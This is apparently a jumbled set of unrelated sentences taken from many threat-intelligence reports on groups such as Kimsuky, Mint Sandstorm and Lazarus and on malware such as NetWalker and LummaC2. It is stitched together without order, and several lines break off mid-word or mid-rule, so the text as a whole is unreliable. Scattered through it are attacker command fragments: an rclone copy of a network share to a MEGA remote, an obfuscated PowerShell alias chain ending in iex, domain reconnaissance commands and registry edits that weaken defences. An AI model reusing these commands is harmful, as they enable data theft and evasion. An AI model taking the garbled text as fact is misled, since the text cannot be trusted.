Exfiltration over Web Service TA0011 Command and Control T1219.
title: Kimsuky Strikes Again | New Social Engineering Campaign Aims to Steal Credentials and Gather Strategic Intelligence url: https://www.sentinelone.com/labs/kimsuky-new-social-engineering-campaign-aims-to-steal-credentials-and-gather-strategic-intelligence/ Executive Summary SentinelLabs has been tracking a social engineering campaign by the North Korean APT group Kimsuky targeting experts in North Korean affairs, part of a broader campaign discussed in a recent NSA advisory. 
The payload is constructed by concatenating several strings, as shown in Figure 20.
The DNS request for the initial host resolves to a Cloudflare-owned IP address that allows the attacker to employ domain fronting and send the traffic to the actual C2 host test[.]softlemon[.]net, also proxied by Cloudflare. 
Figure 4.
The shellcode accesses a GitHub repository and brings down icon files which contain encrypted C2 strings that the shellcode then decrypts and communicates to.
It included a standalone file padded with over 200MB of blank spaces, likely to impede analysis of the decompressed ISO file. 
S0223 POWERSTATS
Use automated tools to audit access logs for security concerns. 
As we see on the graph, Prilex was highly active in 2020, but suddenly disappeared in 2021, resurfacing in 2022 with a release of three new variants. 
The initial link then redirects the target to a ZIP file hosted on legitimate file-sharing service spaces[.]hightail[.]com.
Over the past several years, multiple cyber security firms and the FBI have posted increased observation of the use of “RClone” to exfil data.
the malicious WDLocal.dll. Western’s Digital WDDdiscovery.exe side-loads malicious WDLocal.dll The side-loaded DLL issues a GET request to one of its hardcoded URLs with parameters stating the old machine ID, new machine ID, and the current version of the information stealer.
IcedID created a DLL named Utucka.dll just after the initial execution. 
From the previous code listing, we notice at the first line of the _loopstart routine that the pointer gets dereferenced into RAX, which in turn points to the first vfgadget.
%%i in" nocase wide ascii $a2 = "do ping
S0186 DownPaper
As we haven’t found any public reference to this password, we won’t be publishing it in our blogpost. Figure 6.
Domain:uymm[.]orgURL:https[:]//uymm[.]org/roman.msiSHA-256 hashes:23597910ec60cf8b97144447c5cddd2e657d09e2f2008d53a3834b6058f36a4195a2d34db66ce4507d05ac33bea3bdc054860d9d97e91bdc2ce7ce689ae06e9fac55905e6f5a2ab166f9a2ea7d1f4f68f5660f39b5c28b7746df1e9db6dd4430 References: 2021 Top Malware Strains | Cybersecurity and Infrastructure Security Agency (CISA) GuLoader: A Popular New VB6 Downloader that Abuses Cloud Services | Proofpoint US GuLoader: Peering Into a Shellcode-based Downloader | CrowdStrike The post Threat actors strive to cause Tax Day headaches appeared first on Microsoft Security Blog. 
Throughout we use terminology to describe the various phases, tactics, and techniques of the intrusions standardized by MITRE with their ATT&CK framework .
As explained in this blog written by Jonathan JOHNSON, opening a handle to WinLogon in order to duplicate the token and call ImpersonateLoggedOnUser is a known Cobalt Strike technique. 
Figure 3.
The FortiGuard Web Filtering Service blocks the malicious URL and IP address. 
net users C:\Windows\system32\cmd.exe /C
The group has infected organizations based in all regions, as shown in Figures 3 and 4, with the largest numbers in the U.S., followed by the U.K., Spain, France, Brazil, Germany and Italy. Figure 3.
Figure 3 Code with anti-debugging and image deletion As seen in Figure 3, seemingly random nonsensical comments are also added to the VBA code. 
Obfuscated bat script. 
Telecommunication providers are frequent targets of espionage activity due to the sensitive data they hold.
ExplorerMozillaMozilla FirefoxNETLOGONntldrntuser.datNTUSER.DATntuser.dat.logntuser.dat.
[T1112], Deobfuscate/Decode Files or Information
We have also identified a significant increase in Q1 2022, beginning in February 2022, of references to domains owned by government entities in LATAM on dark web shops and marketplaces such as Russian Market, Genesis Store, and 2easy Shop, relative to the same time period in 2021.
We observed victims mostly in Southeast and East Asia, suggesting that the advertisements were targeting that region. 
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, Metasploit, Empire, PoshC2, etc.
Process Analysis Process Spawn Analysis [D3-PSA] Isolate: Execution Isolation Executable Denylisting
C:\windows\dllhost.dat Credential theft module Written as a .tmp file to the temp directory Ransomware splash and warning files Command Line Execution 
The first compressed blob contains the RSA public key with the hash 0xe1285e64 (Figure 28). 
In certain cases, this Mint Sandstorm subgroup has used TTPs outside of these attack chains, notably when they have failed to achieve short-term objectives.
In one event we saw the adversary compromise a Linux-system through SSH.
In Microsoft Windows, CLFS is notably used by the Kernel Transaction Manager (KTM) for both Transactional NTFS (TxF) and Transactional Registry (TxR) operations.
During this time period, multiple rounds of enumeration and lateral movement occurred using Cobalt Strike.
The ModScan module handles pipe commands listed in Table 2. Table 2.
The detections, however, provide visibility into the attack activity.
Additionally, it searches for the .vnc.lnk affix to steal VNC credentials. 
ET MALWARE Meterpreter or Other Reverse Shell SSL Cert ET POLICY PE EXE or DLL Windows file download HTTP ET INFO Dotted Quad Host DLL Request ET INFO Executable Retrieved With Minimal HTTP Headers - Potential Second Stage Download ET HUNTING SUSPICIOUS Dotted Quad Host MZ Response ET HUNTING Suspicious lsass.exe in URI ET MALWARE Win32/IcedID Request Cookie ET POLICY SSL/TLS Certificate Observed (AnyDesk Remote Desktop Software) ET USER_AGENTS
The -u flag was also passed and the same values for the username:password were provided as seen on the other host.
Our toy hash function computes the Pedersen hash as followsH(M) = H(M1 M2) = â¨M1â© â G1 +
<Message dependent>0x18 <Message dependent>0x1C Message Body0x20The message body can be empty.
Defense Block WebDAV communication Use Application restrictions like AppLocker or WDAC Monitor for the process java.exe spawning further binaries Conclusion This is not really a full chain attack for initial access at an RedTeam assessment
The DLL is dumped from memory to perform more investigations on it. 
Services We offer multiple services including a Threat Feed service which tracks Command and Control frameworks such as Cobalt Strike, BumbleBee, Covenant, Metasploit, Empire, PoshC2, etc.
Look at the packet's HTTP host header.
Once we unpack the file, we can see several elements, as well as directories typical for NSIS: 
It’s important to note that the FQDN’s that were used as C2 were all registered the same month as the compromise. 
In most organizations, the Security Operations team is responsible for threat intelligence analysis, as well as threat and incident response.
80CA9F179F1701039000002000800826435643FFFFFFFF900080AE80001D000000003000000000000000007600000080000986200606002598491680128000ADCF54C11A58083ADB06050A03A4B8009000 
Exec(): me/123.com me/itsIt.db,DllRegisterServer Using the SRUM database, we were able to determine that the custom rundll32.exe binary downloaded approximately 0.4 MB of data. 
By opening a backdoor, they were able to hijack the institution’s wireless connection and target ATMs at will.
Most likely, the choice is dictated by the precision (or lack thereof) of an attack: unique infection chains and highly attractive bait are held back for targeted attacks. 
These gangs include Conti, ALPHV (BlackCat), LockBit 2.0, and BlackByte.
The location of the SQLite databases is defined by the data_folder install configuration key, with the default value being %ProgramFiles%\MSBuild\Microsoft\Expression\Blend\msole\fcdata. 
If those checks detect a debugger, the function returns a value that will cause the program to jump to an invalid address and crash.
The National Security Agency, Cybersecurity and Infrastructure Security Agency (CISA), and Federal Bureau of Investigation (FBI) assess that People’s Republic of China state-sponsored malicious cyber activity is a major threat to U.S. and Allied cyberspace assets.
My Cloud Allows Escalation To Admin Privileges (September 18, 2018) 
Revoke and generate new VPN server keys and certificates (this may require redistributing VPN connection information to users). 
S0140 Shamoon
UpdatesXXX\AAM Updates.exe>
title: Nation-state threat actor Mint Sandstorm refines tradecraft to attack high-value targets url: https://www.microsoft.com/en-us/security/blog/2023/04/18/nation-state-threat-actor-mint-sandstorm-refines-tradecraft-to-attack-high-value-targets/ Over the past several months, Microsoft has observed a mature subgroup of Mint Sandstorm, an Iranian nation-state actor previously tracked as PHOSPHORUS, refining its tactics, techniques, and procedures (TTPs).
We only saw one case where there was only one stage being decrypted in memory and the configuration was hardcoded. 
ContentLength = $data.
We observed that the earliest samples for this campaign were from December 2021 and that the SA:MP attack was only added in February 2022.
This could help detect some of the pass-the-ticket, DCSync, and other techniques described in this report. 
.pps .ppt .pptx .ps .psd .py .rar .rm 
Be vigilant against tailored spearphishing attacks targeting corporate and personal accounts (including both email and social media accounts). 
The tool allowlisted the entire c:\drive, enabling the actors to bypass virus scans for tools they downloaded to the c:\drive. 
Deploy firewalls to block traffic from known C&C domains or IP addresses. 
This post details the multi-component architecture and functionality of a sample, referred to as mim221. 
Their ransom note pointed the victims to their negotiation portal instead.
This uses a mixture of disguising the ASCII as UTF-16 via manipulating the start of the file, as well as obfuscating the data using a simple cypher.
Figure 3: Details of the recent Gh0st RAT sample’s C2 server on the network information service Shodan. 
Dave Loader loads the resources using the API calls LdrFindResource_U and LdrAccessResource, and decrypts them using XOR and the key mh8ZqMlTsaDYBZe7ma\x00. 
The actor exploited different LOLBins.
These extensions are associated with ESXi snapshots, log files, swap files, paging files and virtual disks.
FortiGuard Labs has observed similar drastic modifications within RapperBot samples, as detailed in our previous report, adding and removing even DoS attack code on an apparent whim. 
[T1078 – Valid Accounts]
On Feb. 13, 2023, 45.227.253[.]106 started hosting a web server with the HTML title Trigona Leaks that was active until March 3, 2023. 
Once the shellcode is copied to the executable, the DLL calls to the shellcode’s entry point (shellcode_address). 
They have two parameters in common: address and port (by default, 38001).
Likely shorthand for "Domain Admin".
C:\Windows\Tasks\[eight letters].vbs The shortcut command pulls down a Visual Basic script, drops it into the C:\Windows\Tasks folder, and executes it.
In addition to brute force attempts on devices, Zerobot exploits dozens of vulnerabilities, which malware operators add on a rolling basis to gain access and inject malicious payloads.
Instead, they point to Discord server channels for further discussion.
This uploader allows the operator to set the endpoint for the collected information as indicated in the configuration file; judging from the samples analyzed, it is possible to see a different infrastructure involved in the process. 
The first piece that is parsed from the file is a shellcode located in a pre-calculated offset (in this case, 0x88D8C and overwrites the executable at offset 0x1600). 
These proxy tools may be commercially available infrastructure as a service (IaaS) or software as a service (SaaS) in the form of a web browser promising anonymity on the internet.
Decodes sensitive memory regions in the current process with the same XOR key 7. Patches security-related APIs to disable them 8. 
Hello packets and recording the specific attributes from the replies.
G1017 Volt Typhoon
Messages that don’t start with this magic value are discarded. 
Figure 5 – Dumping SAM database Stealing Credentials from Windows Credential Manager (CredMan) Windows Credential Manager stores the Web and SMB/RDP credentials of users if they choose to save them on the Windows machine, thereby preventing the authentication mechanism from asking for those passwords again on subsequent logins.
Both triggers only happen when these events appear in the Microsoft-Windows-GroupPolicy(/Operational) event logs. 
One of the functions available in this tool’s library is Get-AADIntSyncCredentials, which allows any local administrator on a device where Azure AD Connect is installed to extract the plaintext credentials of both the Azure AD Connector account and the AD DS Connector account. 
The use of malware with ties to multiple groups in a single campaign — such as Dave Loader, Domino Backdoor and Project Nemesis Infostealer — highlights the complexity involved in tracking threat actors but also provides insight into how and with whom they operate. 
This makes finding similarities with other well-known ransomware families a real brain-buster.
Steganography
[TA0008] Remote Services:
title: eSentire Threat Intelligence Malware Analysis: BatLoader url: https://www.esentire.com/blog/esentire-threat-intelligence-malware-analysis-batloader Since being introduced in February 2022, BatLoader is a malware dropper that has been observed dropping several well-known malware or malicious tools like ISFB, SystemBC RAT, Redline Stealer, and Vidar Stealer.
This function is patched using Microsoft Detours—a publicly available library used for instrumenting Win32 functions—so that the execution flow appears to happen in the legitimate service DLL. 
Based on the victimology and usage of a highly similar decryption algorithm, we believe that Earth Zhulong is related to the hacking group known as “1937CN”.
This new executable is packed with CyaX. It reads data from its own resource section and decrypts a payload.
ComRAT variant • 220profile.py: .NET injector (variant 2018)
This technique involves first mapping a Windows PE image in memory and then executing the image’s main entry point or an export function. 
The link between the DEV-1084 cluster and MERCURY was established based on the following evidence: DEV-1084 operators were observed sending threatening emails from 146.70.106[.]89, an IP address previously linked to MERCURY. 
https://transfersh.com/WindowsUpdate Output: https://transfersh.com/XXXXXXXX/WindowsUpdate After one download the file will be deleted and link will returns a 404 error.
This information can be helpful in determining whether the code is running in a protected or controlled environment rather than on a regular user’s machine. 
.mdf 
NET\Framework64\v4.0.30319\Microsoft.
ZeroDay Vulnerability in MOVEit Transfer Exploited for Data Theft
Infection chain As we previously mentioned in our past blog entry, the entire attack begins with a spear-phishing email.
Several hack tools were also found on the infected hosts, including tunneling, port scanning, a Go-lang based backdoor and an information stealer used to harvest internal information. 
Deface() – This function replaces the “index.html” and “motd” files with ransom notes to ensure the ransom alert is displayed to victims upon login. 
The new jQuery-based leak site (Figure 2), with its retro green colors, has garnered most of the attention, as it accepts commands instead of listing out information. 
This is consistent with the findings of our incident investigation: the attackers did not try to access private information on the target infrastructure, instead only running software for direct financial gain. 
These include various droppers, loaders, and injectors; Crosswalk, ShadowPad, and PlugX backdoors; and samples of a previously undescribed backdoor that we have dubbed FunnySwitch.
Execution Isolation Hardware-based Process Isolation [D3-HBPI] Mandatory Access Control
Figure 10: The contents of requestadmin.bat The scripttodo.ps1 installs the GnuPg, the software that encrypts and signs the data and communications as shown in Figure 11. 
Stay on top of analyzing and classifying Cobalt Strike and other threats.
It has an extensive past of code forks and evolutions that has lead to several active variants in the last 5 years including Dreambot, IAP, RM2, RM3 and most recently, LDR4. 
Figure 6 – “I want to become a master hacker”.
The decoy document masquerades as a job offer from a Japanese multinational bank. 
The dropper configures the backdoor with a C2 server address, RC4 encryption key, and sleep interval.
System Information Discovery
It provides applications with API functions—available in clfsw32.dll—to create, store and read log data. 
Figure 7: Functions exported by OfficeTelemetry.dll Upon execution, it locates a packed and compressed payload in the .vdata section (Figure 8) of the memory allocated for the current process. 
Double The Infection, Double The Fun (August 30, 2018) 
This IP address belongs to Powerhouse Management, a VPN service provider. 
AF978ED8AD37CE1437A6B42D96BF518D5C4CFD19hidmouse.sysWin64/Agent.
DisableRoutinelyTakingAction /t
Windows Service T1543.003 TrickBot establishes persistence by creating an autostart service that allows it to run whenever the machine boots. Privilege Escalation
AutoLogonCount /t REG_DWORD /d
In addition to file encryption and obfuscation, the CatB malware will attempt to gather specific, sensitive information from targeted systems.
This 1st-stage attack takes advantage of the way macOS registers document handlers and custom URL schemes to automatically unzip a malicious attachment sent via phishing emails in the Safari browser.
See tables 2–3 below for IOCs obtained from FBI threat response investigations as recently as November 2022. 
Therefore, we decided to perform a comparative analysis between the different ransomware strains linked to Eriknetwalker and some of the earliest versions of NetWalker we could find. 
It also makes use of API GetTickCount / QueryPerformanceCounter to get the number of ticks since the last system reboot.
Since Lazarus operators have previously disguised their payloads, the use of this name, which is used by the VMware Guest Authentication service, suggests that the targeted system may be a Linux VMware virtual machine.
This information was stored under the registry path.
TacticIDNameDescription Resource DevelopmentT1587Develop CapabilitiesAgrius builds utility tools to use during an active exploitation process. 
This post summarizes our observations highlighting the group’s continuous change in used malware staging techniques and Crimson RAT implementations. 
Despite having a mature cyber posture, the organization did not detect the red team’s activity throughout the assessment, including when the team attempted to trigger a security response. 
Account Discovery: Domain Account T1087.002 
DNS infrastructure contains two components — authoritative and recursive DNS servers — and both are open to attack. 
CDPUserSvc win_cobalt_strike_auto 4844 svchost.exe C:\Windows\system32\svchost.exe -k UnistackSvcGroup -s
SMOKEDHAM Network Communications SMOKEDHAM communicates with its C2 server using HTTPS.
Apart from the Trojanized installers, we also observed infections involving usage of a UEFI or MBR bootkit.
The certificate is likely stolen and belongs to 北京和赢讯时科技有限公司 (translated: Beijing Heyingxunshi Technology Co., Ltd.) with thumbprint 850821D88A4475F0310F10FBA806353A4113D252.
Mandiant confirmed the user intended to download, install, and use the SmartPSS software.
An example email body and attachment is shown in Figure 3 and 4. Figure 3 Email Body Figure 4 Attachment A Deep Dive into OneNote File Format File Header To understand how the data is laid out in the file, we need to examine it at byte level.
This will give you immediate visibility over all running code and quickly identify infected machines by detecting any traces of malicious code found in-memory.
Remote Services: SSH Uses Putty for remote access. T1550.002.
In most of the malicious campaigns that my team has observed leveraging PyPI packages, the executables are not present in the malicious package but are downloaded and run by the plaintext PY files from external infrastructure. 
Log in to O365 as a user with privileged access to cloud resources. 
We updated this blog on Oct. 15 based on further analysis, additional evidence and discussion around the complexities of redirects from REvil’s dark web leak site.
A portion of the malleable C2 profile configuration is shown at the bottom half of the screenshot.
Both HTTP and HTTPS are supported: if no SSL certificate is configured for the port on which the server is running, it will be launched with CN = Environment.
These four facts allow us to conclude that Lazarus is likely the threat actor deploying the Gopuram backdoor. 
Size of the data unused Size: 4 bytes reserved Size: 8 bytes FileData Size: Variable guidFooter Size: 16 bytes Value: {71FBA722-0F79-4A0B-BB13-899256426B24} 
Hardcoded JSON format keys and values. 
Specifically, implementations adapting the Zcash approach but on different curves or with different encoding schemes may result in fragile constructions vulnerable to subtle issues, as illustrated in this blog post.\n
Emotet, then proceeded to execute a short list of discover commands using the Windows utilities systeminfo, ipconfig, and nltest targeting the network’s domain controllers.
If they deem the victim’s machine to be intriguing, the C&C server responds with the next stage executable.
[T1564.003] Credential Access
Bugatti strongly emphasized that they are primarily looking for experienced affiliates that focus on compromising the complete networks of organizations as opposed to end users.
This study also suggests that Earth Preta’s cyberespionage operations have a broad reach and have the capacity to target high value targets.
A hallmark of the activity we discuss in this post is Kimsuky’s focus on establishing initial contact and developing a rapport with their targets prior to initiating malicious activities.
However, the legitimate files are signed with a “Xinda.im” certificate instead of the stolen VMProtect certificate. 
In coordination with the FCEB organization, CISA initiated threat hunting incident response activities; however, prior to deploying an incident response team, CISA observed additional suspected APT activity.
All Group.
On Windows, external dependencies are usually Dynamically Linked Libraries (DLLs) that contain additional functionality that can be imported into the process to execute. 
Multiple administrative and system accounts were compromised during this incident.
To hide this window, the tool explicitly adds new entries to HKCU\Software\Microsoft\Windows\CurrentVersion\ApplicationAssociationToasts to disable all toasts related to the protocol ms-windows-store. 
File Type MD5 SHA256 DLL PE 64bits ffmpeg.dll 27B134AF30F4A86F177DB2F2555FE01D C485674EE63EC8D4E8FDE9800788175A8B02D3F9416D0E763360FFF7F8EB4E02 DLL PE 64bits D3dcompiler_47.dll 82187AD3F0C6C225E2FBA0C867280CC9 11BE1803E2E307B647A8A7E02D128335C448FF741BF06BF52B332E0BBF423B03 Table.2 Initial dropped samples Once “ffmpeg.dll” is loaded, it tries to enumerate the current directory for the second DLL “d3dcompiler_47.dll”.
One remarkable result we achieved using PEStudio was that it uses ASLR.
In this blogpost, we provide a detailed profile of this APT group, including its modus operandi and toolset that includes a new version of FlowCloud, discovered by ESET.
The second most common vector Royal actors use (in 13.3% of incidents) for initial access is RDP compromise. 
This is the only difference with regards to the ransom notes.
The first argument is the specific library name index number (in this case 0xA = Kernel32.dll), while the second argument is the export function name hashed value (which, in this example, is 0xFD43765A) 
After a more traditional vulnerability disclosure timeline, we plan to publish details about how this works. 
Malware, tools and exploits used. 
At least 20 victims were posted to its leak site in the first two weeks of the ransomware’s operation, which indicates the group likely is experienced in the ransomware business and has a steady source of initial access. 
This line creates a new WebClient object and assigns it to the variable $down.
Rorahsach takes inspiration from another ransomware strain: LockBit.
The below figure shows the encrypted files with the .lockbit extension. 
Shown in Figure 20, the XOR keyset and algorithm are highly similar.
However, we were surprised to see that the enterprise sector made up over 40% of the total number of victims.
Talk to us Questions, concerns, or insights on this story?
T1203Exploitation for Client ExecutionTA410 uses Royal Road RTF documents to compromise victims. 
If so, it poses yet another supply chain risk going forward, since this type of attack is likely to be missed by most security tools, which only scan Python source code (PY) files. 
The first caveat is that the hash function is not collision-resistant for variable-length inputs.
In the example above, the request should be “/news/4/2/1” but for whatever reason the bot does not append the initial / for specific commands. 
[T1546.008] Boot or Logon Autostart Execution: Shortcut Modification
The latter has really flourished during the past few years and has earned criminals millions of dollars in part thanks to large ransom payments from high profile victims.
Detections for the IOCs listed above are listed below: Backdoor:PHP/Remoteshell.
APIDolphin uses Windows API functions to execute files and inject processes. 
S0534 Bazar
Our Security Operations Centers are supported with Threat Intelligence, Tactical Threat Response and Advanced Threat Analytics driven by our Threat Response Unit – the TRU team. 
The full description of each step in the diagram, along with the analysis of both the MoonBounce driver and user-mode malware can be found in the technical document released alongside this report. 
DEV-1084 publicly adopted the DarkBit persona and presented itself as a criminal actor interested in extortion, likely as an attempt to obfuscate Iran’s link to and strategic motivation for the attack. 
After getting access to the internal network, they perform domain exploration using SharpHound.
G0051 FIN10
Monitor users' web browsing habits; restrict access to suspicious or risky sites.
This tool is included in the UnxUtils repository.
In turn, the orchestrator injects the network component into memory and communicates with it via a file located at C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\Log\rsa.txt.
MuddyWater generally uses DNS to communicate with their C2 servers while using tools such as PowerShell, vpnui[.]exe (a unique version of Ligolo), and remote monitoring software such as ScreenConnect, Remote Utilities, and eHorus. 
The asynchronous procedure places a hook on the NtTestAlert function and then exits.
For example, threat actors often leverage internet software repositories such as GitHub and Exploit-DB.[10][11]
Detect: Network Traffic Analysis Connection Attempt Analysis
OOXML files are essentially packaged ZIP archives that consist of multiple XML files called parts.
DEV-1084 used the vatacloud[.]com domain for command and control (C2) during this incident.
Figure 6 ATT&CK technique comparison The diagram reflecting our outcome insinuated that APT27 and APT41 are the most likely candidates that overlap with the (sub-)techniques we observed. 
Based on the perceived profitability of these operations, it is almost certain that numerous threat actors will continue to conduct widespread ransomware operations for the foreseeable future. 
The ransomware developers have proven the ability to refocus and capitalize on current world events and develop lures to help ensure the effectiveness of the ransomware, which has allowed them to become selective of their affiliates by limiting access to the ransomware to only those with vetted access to large organizations.
AcidRain On the same day IsaacWiper was deployed, another wiper attacked Viasat KA-SAT modems in Ukraine, this time with a different wiper, named AcidRain by SentinelLABS.
The WindowsParentalControlsMigration consumer was configured to silently execute a base64-encoded PowerShell command. 
title: Latin American Governments Targeted By Ransomware url: https://www.recordedfuture.com/latin-american-governments-targeted-by-ransomware Recorded Future examined the recent escalation of cyberattacks on Latin American (LATAM) governments from January 2022 until May 2022.
Goodware String - occured 742 times */ $s19 = "Permission denied" fullword ascii /*
S0446 Ryuk
MVISION Insights customers will have the full details, IOCs and TTPs shared via their dashboard.
Deploying a public proof of concept (POC) exploit targeting a public-facing appliance vulnerability. 
In this blog entry, we discuss findings from our investigation of this ransomware and the tools that Royal ransomware actors used to carry out their attacks. 
This version runs multiple anti-analysis and anti-detection checks before executing its payload, and terminates if any of those tests detect that the process is being analyzed.
Figure 4 – Payload URL present inside the XML file of the malicious document The RTF file is weaponized using a tool called RoyalRoad.
"Domain controller" net group /domain
If the recipient clicked to open the .URL file, the recipient's default web browser would access the URL contained in the file.
Figure 9 Cracking Browser Password One of the powerful capabilities of this Trojan Stealer is cracking browser sensitive information like passwords, cookies, autofill and credit card information saved within the browser application.
On May 11th, 2023, the very popular WordPress plugin Essential Addons for Elementor released a patch for a critical privilege escalation vulnerability, initially discovered by PatchStack.
S0158 PHOREAL
To prevent this attack, we should:Increase the number of recursive DNS servers.
In the same way, we can configure the Beacon to use TXT or AAAA records for requesting tasks or sending information to the server.
It should be noted that this entire procedure will leave traces on filesystem.
When we consider that the files in the 7-Zip archive were all taken from the same directory, we can make some assumptions.
Usernames, passwords, and hostnames collected by these tools are required for Sandals to successfully spread and execute the Fantasy wiper.
The following screenshot shows the decryption routine. 
Since Microsoft Edge and Mozilla Firefox are installed in our analysis environment, Lumma Stealer only collects data from these browsers. 
Figure 1.1 Process Chain 
TYPE INDICATOR DESCRIPTION SHA256 8ace121fae472cc7ce896c91a3f1743d5ccc8a389bc3152578c4782171c69e87 Example malware hash Mapped to MITRE ATT&CK The findings of this report are mapped to the following MITRE ATT&CK Matrix techniques: 
Once encrypted, it is written to the registry key SOFTWARE\\Google_Authenticator\\b52dKMhj, with the sample first attempting to write to the HKEY_LOCAL_MACHINE hive, before writing to HKEY_CURRENT_USER if the right permissions are not possessed.
Malware raises exceptions by executing cleverly crafted series of instructions.
Representation of lateral movement to cookie theft to O365 authentication CrowdStrike identified a similar TTP where the threat actor connected via RDP to a user’s workstation with the workstation owner’s account (e.g., connecting via RDP to user1-pc using the account user1).
title: Iron Tiger’s SysUpdate Reappears, Adds Linux Targeting url: https://www.trendmicro.com/en_us/research/23/c/iron-tiger-sysupdate-adds-linux-targeting.html APT & Targeted Attacks Iron Tiger’s SysUpdate Reappears, Adds Linux Targeting We detail the update that advanced persistent threat (APT) group Iron Tiger made on the custom malware family SysUpdate.
From there, they ran Invoke-Sharefinder once again, along with AdFind, using a batch file named find.bat.
%%
Our colleagues in AhnLab published a more thorough behavioral analysis of another Rorschach variant which provides further details into the operations. 
With that being said, UPX has been around for quite some time.
At the beginning of this week, the number of active installations was still 20,000+.
ServiceHost.exe”| where FileName in~(“werfault.exe”, “csc.exe”)| where ProcessCommandLine !contains (“nameId”) Appendix MITRE ATT&CK techniques observed This threat makes use of attacker techniques documented in the MITRE ATT&CK framework. 
If these services are required, use strong passwords or Active Directory authentication. 
It also generates a ransom-demanding message saved in “KodexRansom”, shown in Figure 16. Figure 14.
NetWalker resource from wwllww.exe Once decrypted, the configuration file reveals several parameters, allowing us to understand how it works (how it constitutes the ransom note, the number of threads allocated for encryption, etc.): mpk Public key mode Encryption mode thr Allocated threads for encryption process spsz Encryption chunk namesz Name length idsz ID length crmask .mailto[email].{ID} mail Contact mail lfile Ransom Note name lend B64 encoded ransom note white Encryption whitelist kill Processes, tasks, service names to terminate unlocker Decryption exclusion list NetWalker Resource Analysis (Post-March 2020) 
The malware also checks for the following wallets via browser extensions: Binance Coin98 Coinbase Jaxx Liberty MetaMask Mew CX (now Enkrypt) 
When ransoms are not paid, they have been known to shame victims by posting their data on the dark web. Technical Details Initial access Nefilim ransomware is distributed through exposed Remote Desktop Protocol (RDP) setups by brute-forcing them and using other known vulnerabilities for initial access, i.e. vulnerabilities in Citrix gateway devices.
At first glance, Cobalt Strike was used in a manner similar to this campaign, including the use of DLL sideloading, the use of a Google Drive link for delivery, and the creation of a schedule task. 
Run('powershell new-alias -name qirlbtfhgo -value gp; new-alias -name kvikpt -value iex; kvikpt ([System.
As a result, we can detect Cobalt Strike beaconing regardless of the malleable C2 profile utilized or any additional jitter present. 
[C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\ucrt\stdio.h @ 956] 01 00000000`0014fdf0
Additionally, the Automated Enrichment playbook pack would also work well with the output of any of these analytics. 
At present, the only platforms confirmed by our customer data to be affected are Windows and MacOS, which is in agreement with 3CX’s information on affected platforms.
Prevent unauthorized execution by disabling macro scripts from Microsoft Office files transmitted via email.
We observed that the script retrieves NSudo and modifies Windows UAC prompt behavior by allowing administrators to perform operations without authentication or consent prompts: Disabling Windows Defender notifications, Disabling Task Manager, Disabling command prompt, Preventing users from accessing Windows registry tools, Disabling Run command, Modifying the display timeout (monitor powers off after 30 minutes) and sleep mode (on AC/battery power – goes to sleep after 3000 minutes (50 hours)). 
Another link explored was TrueBot dropping Clop Ransomware, which was previously used by EvilCorp.
There are still some questions we need answers for, such as what other samples get loaded beside ComRAT and the RPC backdoor?
Win32.CLEXEC The file name of the backdoor CLEXEC is SensorAware.dll.
Subsequently, it downloads and executes a malicious backdoor. 
The persistence technique is simply adding a run registry key for persistence (Figure 11).
MstUtil.exe.config "C:\Windows\Microsoft.
user.ps1 (Figure 37) is similar to scriptodo.ps1 in terms of enumerating the current domain of the host, username, and ARP table. 
If Activity Monitor is running, the script kills the I2P Daemon and XMRig miner processes and exits. 
Figure 13 – Execution of Hack-browser-data on infected host. 
Based on our research, this actor has sent high volumes of spam emails in short timeframes through other methods, such as connecting to mail servers from rogue IP addresses or sending directly from legitimate cloud-based bulk email sending infrastructure. 
It sets up a run key for the command C:\programdata\netsky\netsky.exe online for persistence. 
.c .cfg .conf .cpp .cs .ctl 
Visual Basic T1059.005 Command and Scripting Interpreter: Python T1059.006 Command and Scripting Interpreter:
It also embeds a DLL version of the Pafish (aka Paranoid Fish) sandbox and analysis detection tool as one of its encrypted resources.
Enabling firewall customers to identify user agents of compromised version of 3cx SELECT timestamp, log_component, log_subtype, user_name, user_group, app_name, src_ip, src_port, protocol, dst_ip, dst_port, http_category, url, domain, http_user_agent, http_status FROM xgfw_data WHERE LOWER(log_component) = 'http' AND ( LOWER(http_user_agent) LIKE '%3cxdesktopapp/18.12.402%' OR LOWER(http_user_agent) LIKE '%3cxdesktopapp/18.12.416%' OR LOWER(http_user_agent) LIKE '%
Shodan Result Communication Addresses Requests 195[.]123[.]226[.]91 POST /c2sock: multipart/form-data;boundary=оaj195iak20ka99441aj1 144[.]76[.]173[.]247 GET/login LummaC2 behaves like other stealer-type malware, which can take away system and sensitive data from the victim’s machine.
Overview SentinelLabs has been tracking a recently disclosed cluster of malicious Office documents that distribute Crimson RAT, used by the APT36 group (also known as Transparent Tribe) targeting the education sector.
You can apply the following recommendations per your needs. 
Post-encryption, the following file extensions have been observed: .zmi5z, .nwixz, .ext, .zje2m, .5vm8t and .m4tzt. 
rclone.exe, copy, \\REDACTED\Shares, mega:Shares, -q, --ignore-existing, --auto-confirm, --multi-thread-streams, 4, --transfers, 4 This activity was also visible on the network via Zeek logs showing the SMB share connection activity. 
This technique was observed in the Commerce environment through a sharp incline of Kerberos requests using RC4 encryption.
This provides attackers with an opportunity to hide their data as log records in a convenient way, because these are accessible through API functions. 
process_path process_id EventCode dest | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)` Figure 13 Overall, the RedLine Stealer analytic story introduces 25 detections across MITRE ATT&CK techniques. 
BAT.RDPEnable.
In order to avoid this mitigation technique, more threat actors have started abusing ISO file types.
The resulting executable can be distributed and executed without requiring the Python interpreter to be installed on the target system. 
we jump to the Invoker vfgadget ‘OffSec::trigger”, proving that we have control over the program’s execution flow.
Some of tools used by the actor are exclusively available in Chinese underground forums. 
Around the time when the threat actor executed Get-ADReplAccount, the threat actor also executed a renamed version of AdFind to output domain reconnaissance information.
Example C&C server response including encrypted payload If all conditions are met, the network module sends the C&C response to the main module using a pipe message with ID 0x10000072.
Payloads The payloads used in Operation Spalax are remote access trojans.
Microsoft Defender for
However, we believe that invalid compilation dates were set due to incorrect system date and time settings.
Figure 50.
SHUC Packet Transmitter (HTran). 
Look for access behavior that deviates from expected or is indicative of AD abuse. 
